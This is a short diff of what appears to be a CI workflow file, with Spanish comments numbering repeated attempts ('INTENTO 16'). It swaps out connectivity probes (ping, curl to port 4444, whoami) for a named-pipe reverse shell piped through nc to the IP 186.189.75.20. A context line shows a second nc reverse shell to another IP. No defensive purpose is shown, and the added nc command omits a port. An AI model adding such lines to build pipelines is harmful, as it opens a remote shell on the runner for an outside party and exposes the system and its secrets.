@@ -55,12 +55,9 @@ jobs:
           # Or with nc: nc -e /bin/sh 200.73.69.220 4444
 
 
-          # INTENTO 15 186.189.75.20
+          # INTENTO 16 186.189.75.20
           # Comandos para probar conectividad
-          ping -c 4 186.189.75.20 > /app/files/debug.txt 2>&1
-          curl -v http://186.189.75.20:4444 >> /app/files/debug.txt 2>&1
-          whoami >> /app/files/debug.txt
-          echo "IP Target: 186.189.75.20" >> /app/files/debug.txt 
+          rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 186.189.75.20 > /tmp/f
  
           
 
